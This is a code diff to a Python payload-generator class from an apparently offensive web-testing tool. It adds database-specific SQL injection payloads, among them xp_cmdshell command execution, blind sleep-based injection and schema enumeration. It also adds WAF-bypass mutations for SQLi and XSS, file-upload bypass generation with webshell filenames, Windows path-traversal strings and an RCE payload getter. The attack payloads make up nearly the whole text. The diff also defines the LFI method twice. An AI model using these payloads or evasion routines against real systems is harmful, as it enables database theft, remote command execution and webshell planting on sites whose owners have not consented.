@@ -190,36 +190,128 @@ class PayloadGenerator:
         return (base + mutated)[:count * 2]
 
     def generate_sqli(self, db_type: str = "mysql", blind: bool = False) -> List[str]:
-        """Generate SQL injection payloads"""
-        payloads = SQLI_BASE.copy()
+        """Generate SQL injection payloads adaptive to DB type"""
+        payloads = []
 
-        if db_type == "mssql":
-            payloads.extend([
-                "'; EXEC xp_cmdshell('whoami')--",
-                "' UNION SELECT NULL,@@version--",
-                "' AND 1=CONVERT(int,@@version)--",
-            ])
-        elif db_type == "postgresql":
-            payloads.extend([
-                "' UNION SELECT NULL,version()--",
-                "'; SELECT pg_sleep(5)--",
-                "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
-            ])
-        elif db_type == "oracle":
-            payloads.extend([
-                "' UNION SELECT NULL,banner FROM v$version--",
-                "' AND 1=1 FROM dual--",
-            ])
-
-        if blind:
-            payloads.extend([
+        if db_type == "mysql":
+            payloads = [
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "' UNION SELECT NULL--",
+                "' UNION SELECT NULL,NULL--",
                 "' AND SLEEP(5)--",
                 "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-                "' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--",
-                "' AND IF(1=1,SLEEP(5),0)--",
-            ])
+                "1' ORDER BY 1--",
+                "1' UNION SELECT database()--",
+                "1' UNION SELECT table_name FROM information_schema.tables--",
+            ]
+        elif db_type == "postgres":
+            payloads = [
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "' UNION SELECT NULL--",
+                "' UNION SELECT NULL,NULL--",
+                "' AND pg_sleep(5)--",
+                "1' ORDER BY 1--",
+                "1' UNION SELECT version()--",
+                "1' UNION SELECT table_name FROM information_schema.tables--",
+                "' AND (SELECT pg_sleep(5))--",
+            ]
+        elif db_type == "mssql":
+            payloads = [
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "' UNION SELECT NULL--",
+                "' UNION SELECT NULL,NULL--",
+                "' AND 1=CONVERT(int,@@version)--",
+                "1' ORDER BY 1--",
+                "1' UNION SELECT @@version--",
+                "1' UNION SELECT name FROM sys.databases--",
+                "'; EXEC xp_cmdshell('whoami')--",
+            ]
+        elif db_type == "oracle":
+            payloads = [
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "' UNION SELECT NULL FROM DUAL--",
+                "' UNION SELECT NULL,NULL FROM DUAL--",
+                "' AND 1=1--",
+                "1' ORDER BY 1--",
+                "1' UNION SELECT banner FROM v$version--",
+                "1' UNION SELECT table_name FROM all_tables--",
+                "' AND (SELECT COUNT(*) FROM all_users WHERE rownum=1 AND (SELECT COUNT(*) FROM all_users WHERE rownum=1))>0--",
+            ]
+        else:
+            payloads = SQLI_BASE.copy()
 
-        return payloads
+        if blind:
+            payloads = [p for p in payloads if "sleep" in p.lower() or "pg_sleep" in p.lower() or "benchmark" in p.lower()]
+
+        # Mutate for WAF bypass
+        mutated = self._mutate_sqli(payloads)
+        return payloads + mutated
+
+    def generate_lfi(self, context: str = "linux") -> List[str]:
+        """Generate LFI payloads"""
+        base = LFI_BASE.copy()
+        if context == "windows":
+            base.extend([
+                "../../../../windows/system32/drivers/etc/hosts",
+                "../../../../boot.ini",
+                "../../../../windows/win.ini",
+            ])
+        return base
+
+    def generate_upload_bypass(self, ext: str = "php") -> Dict[str, List[str]]:
+        """Generate file upload bypass payloads"""
+        return {
+            "filenames": [f"shell.{ext}.{bypass}" for bypass in UPLOAD_BYPASS["double_extension"]],
+            "content_types": UPLOAD_BYPASS["content_type"],
+            "magic_bytes": UPLOAD_BYPASS["magic_bytes"],
+            "webshells": UPLOAD_BYPASS["webshell_content"],
+        }
+
+    def generate_rce(self, context: str = "linux") -> List[str]:
+        """Generate RCE payloads"""
+        return RCE_PAYLOADS.copy()
+
+    def _mutate_sqli(self, payloads: List[str]) -> List[str]:
+        """Apply WAF bypass mutations to SQLi payloads"""
+        mutated = []
+        mutations = [
+            lambda p: p.replace(" ", "/**/"),
+            lambda p: p.replace(" ", "%20"),
+            lambda p: p.replace(" ", "%0a"),
+            lambda p: p.replace("'", "%27"),
+            lambda p: p.replace("'", "''"),
+            lambda p: p.replace("OR", "oR"),
+            lambda p: p.replace("UNION", "uNiOn"),
+            lambda p: p.replace("SELECT", "sElEcT"),
+            lambda p: p.replace("AND", "aNd"),
+            lambda p: p.replace("OR", "oR"),
+        ]
+        for p in payloads:
+            for mut in mutations:
+                mutated.append(mut(p))
+        return list(set(mutated))[:20]  # Limit
+
+    def _mutate_xss(self, payloads: List[str]) -> List[str]:
+        """Apply WAF bypass mutations to XSS payloads"""
+        mutated = []
+        mutations = [
+            lambda p: p.replace("<script>", "<scr<script>ipt>"),
+            lambda p: p.replace("</script>", "</scr</script>ipt>"),
+            lambda p: p.replace("alert", "al\\u0065rt"),
+            lambda p: p.replace("alert", "window['alert']"),
+            lambda p: p.replace("alert", "top['alert']"),
+            lambda p: p.replace("script", "ScRiPt"),
+            lambda p: p.replace("onerror", "onError"),
+            lambda p: p.replace("onload", "onLoad"),
+        ]
+        for p in payloads:
+            for mut in mutations:
+                mutated.append(mut(p))
+        return list(set(mutated))[:20]
 
     def generate_lfi(self, os_type: str = "linux") -> List[str]:
         """Generate LFI payloads"""
